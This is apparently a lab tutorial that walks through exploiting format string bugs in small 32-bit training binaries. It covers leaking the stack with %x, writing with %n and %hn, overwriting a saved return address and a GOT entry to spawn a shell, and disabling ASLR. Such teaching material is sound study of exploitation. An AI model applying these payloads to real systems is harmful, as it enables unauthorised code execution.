Note that the addresses may not accurately reflect your compiled code


## Format Example

Let's take a look at the stack when printf is called

    b printf
    x/20x $esp (or stack 20 with pwndbg)

The first five words are the arguments for printf. The addresses
of the strings, and the integers.

Notably, the final argument points into the stack, and you can see
it stored on the stack at that address.

If we provide a format string, we can test it out our self.

    ./example_format AAAA %x..%x..%x..%x..%x

We can check out the minimum width modifier

    ./example_format AAAA %10x...%2x...%5x...

What happens if we provide a format string that doesn't match the arguments?

    ./example_format AAAA %x..%x..%x..%x..%x..%x..%x

What happens if we do that ALOT?

    ./example_format AAAA %x..%x..%x..%x..%x..%x..%x..%x..%x..%x..%x..%x..%x

That 41414141 is important. That's the location of the string "AAAA" stored in
the char array in main's stack frame.

Ok, lets do this clever now. (The $ must be escaped, as it has a special meaning
in bash)

    ./example_format AAAA "..%13\$x.."

Cool. One more, then lets get a shell

    ./example_format AAAA "..%13\$n.."

Segmentation Fault. **Boom**. XD

## Controlling EIP

Let's take a look at format.c

This program is susceptible to a buffer overflow. However, before we mess around
with it, let's run checksec.

    checksec format

Format has a stack canary, so we cannot use the buffer overflow.

Fortunately, format also has a format string vulnerability. Let's work on that.
Before we begin, disable ASLR (this randomizes the stack addresses). We can use
a froamt string vulnerability to get around ASLR, but we will do that later.

Disable ASLR:

    sudo sysctl kernel.randomize_va_space=0

With ASLR disabled, lets take a look at the binary.

    b printf
    stack 20

We want to gain control of the stored return address, which is at 0xffffceac.
Just like in the example, we can provide an address and use the %n format to
write to that address. Let's find where our address falls.

    AAAA...%1$x

Thinking about our stack frame, the arguments for printf begin at 0xffffce60,
just above the return address back to vuln. If 0xffffce60 is our format string,
counting backwards, we should find AAAA at argument 5 after that.

    AAAA...%5$x

Awesome. We wanted to overwrite 0xffffceac, so let's try that.

    python -c "print '\xac\xce\xff\xff...%5\$x'" | ./format

Ok, now we want to write to that address using the %n modifier. We can use the
minimum width modifier we saw before to do that. Let's try writing 10 there, and
check out what happens in GDB.

    b printf
    r < <(python -c "print '\xac\xce\xff\xff%10c%5\$n'")
    finish

Well, we wanted to write 10 (0xa), but wrote 14 (0xe). Why? The address counts
as 4 bytes, since it ends up getting printed. Thus, to write a particular value,
we must use:

> what_we_want - bytes_already_written

    b printf
    r < <(python -c "print '\xac\xce\xff\xff%6c%5\$n'")
    finish

The address of shell is at 0x080484cb (disass shell). This is 134513867 - 4 =
134513863

    b printf
    r < <(python -c "print '\xac\xce\xff\xff%134513863c%5\$n'")
    finish

Wow... That's a lot of printing. It worked though!

    python -c "print '\xac\xce\xff\xff%134513863c%5\$n'" | ./format

Huh... That didn't work. We have to tell our shell we want to continue typing
after python is done.

    {python -c "print '\xac\xce\xff\xff%134513863c%5\$n'"; cat - } | ./format
    ls
    whoami

This solution can be found in simple_sol.py

Run the solution like so:

    {./simple_sol.py; cat - } | ./format

## How to get around ASLR

Ok, let's get around ASLR:

    sudo sysctl kernel.randomize_va_space=0

Our solution will now no longer work, as the address of the stored return address
has been randomized. Let's check this out in GDB. Run GDB on format. Note that
GDB will actually turn ASLR off for the program to make it easier to debug, so
we will have to turn it back on.

    show disable-randomization
    set disable-randomization off
    show disable-randomization

With GDB no longer turning off ASLR, run:

    b printf
    r
    AAAA
    stack 21

The return address is no longer stored at 0xffffceac!

To get around ASLR, we are going to overwrite an entry in the GOT table.

In short, the Global Offset Table is used to look up the addresses of library
functions such as printf, system, or gets. The address of the GOT entry is static,
even with ASLR, since the program must call that address directly. Think of the
GOT as a phone book: you look up the known address of the GOT entry, and it tells
you the actual address to go to.

We will change one of these entries to point to shell() instead. To trigger shell,
we must call that function after we overwrite the GOT entry. Taking a look at
format.c, no library function is called after the vulnerable printf. However,
in example_format.c, there is another printf immediately after the vulnerable
printf! Let's exploit the example code!

**The compiler is smart.** If we examine the assembly for main, we see that it replaced
our printf with putchar, since we are only printing a single char. Thus, we actually
need to use putchar instead of printf.

So, game plan:

1. Determine the address of the GOT entry for putchar
2. Use our format string to overwrite that address with shell (0x080484fb)
3. Call putchar (which actually calls shell)

To determine the address of the GOT entry for putchar, we can use binaryninja, or
use objdump:

    objdump -R ./example_format

Ok, so the address of putchar will be stored at 0x0804a01c

Let's setup our format string now. We will use the same method as before: run
GDB and find which variable the address is.

    ./example_format AAAA "%13\$x"

Note that the AAAA is not actually a part of our string, but is just on the
stack! Thus, we don't need to subtract 4 like before! Let's do it! Run the following
in GDB:

    b printf
    r `python -c "print '\x1c\xa0\x04\x08'"` "%134513915x%13\$n"
    c
    x/x 0x0804a01c
    finish
    x/x 0x0804a01c

Now run the program, and get shell!

    ./example_format `python -c "print '\x1c\xa0\x04\x08'"` "%134513915x%13\$n"

Booyah!

## Don't print so much!

The excessive printing from these format strings is a bit annoying, and makes
it extremely annoying to debug. We are **only** writing 0x0804a01c bytes... That's
134513915 bytes. What if the code was at 0x1804a01c? That's 402956316!! Now, what if
the address we wanted to write was a 64 byte address for a system call? 0x7fffffffddc0
That's 140737488346560

We can do better.

There is a special modifier for %n that writes 2 bytes instead of 4. %hn

We can use this to write in smaller chunks. Instead of writing all of 0x080484cb
at one time, we can write 0x84cb to the lower 2 bytes, and 0x0804 to the upper 2
bytes.

We will now need to place two addresses in the format string: one for the lower 2 bytes
and one for the upper 2. Take a look at sol.py for an example.

Calculating the second value to write is a bit more complicated. The first write was
0x84cb, but the second write needs to be 0x0804! We have overshot the second write. However,
we can wrap around to find this value again. If we write 0x10804, only the first 2 bytes get
written, thus writing 0x0804. In the solution, to get this wrap around we do

> secondWrite =  0x0804 + 0x10000 - 0x84cb

Another solution is to do the smaller write first! I didn't do that though so you could see how
the wrap around works. Notice how much faster it prints, since we only make 0x10804 bytes total.

    {./sol.py; cat - } | ./format

